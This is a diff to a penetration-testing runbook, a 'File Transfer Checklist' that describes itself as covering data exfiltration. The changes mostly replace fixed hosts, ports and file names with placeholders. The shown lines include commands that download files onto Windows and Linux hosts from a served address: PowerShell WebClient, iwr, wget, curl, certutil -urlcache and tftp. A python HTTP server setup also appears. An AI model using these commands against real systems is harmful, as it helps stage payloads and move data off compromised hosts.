@@ -1,9 +1,9 @@
 # File Transfer Checklist
+<!--- Status Complete --->
 
 ## Introduction
 
 This runbook is to help with file transfering or data exfiltration. Transfering data to and from hosts is important.  This is a guide to walk through various methods.
-
 
 ## Table of Contents
 
@@ -35,7 +35,7 @@ copy z:\ .
 ### Server
 
 ```sh
-python -m SimpleHTTPServer 8080
+python -m SimpleHTTPServer <port>
 ```
 
 ```sh
@@ -46,17 +46,17 @@ service apache2 start
 
 Windows
 ``` cmd
-powershell -c "(new-object System.Net.WebClient).DownloadFile('http://<IP>/file.exe','C:\temp\file.exe')"
-iwr -uri http://<IP>/file -Outfile c:\temp\file
-wget http://<IP>/file -O file
-curl http://<IP>/file -o file
-certutil -urlcache -f http://<ip>:803/ok.exe ok.exe  
+powershell -c "(new-object System.Net.WebClient).DownloadFile('http://<ip>:<port>/<file.exe>','C:\temp\<file.exe>')"
+iwr -uri http://<ip>/<file> -Outfile c:\temp\<file>
+wget http://<ip>/<file> -O <file>
+curl http://<ip>/<file> -o <file>
+certutil -urlcache -f http://<ip>:<port>/<file> <file>  
 ```
 
 Linux
 ```sh
-wget http://<ip>/file
-curl http://<ip>/file > file
+wget http://<ip>/<file>
+curl http://<ip>/<file> > <file>
 ```
 
 ## Pure-FTPd
@@ -97,7 +97,7 @@ sudo atftpd --daemon --port 69 /tftp
 ```
 Transfer
 ```
-tftp -i <IP> get file
+tftp -i <ip> get file
 ```
 
 ## scp
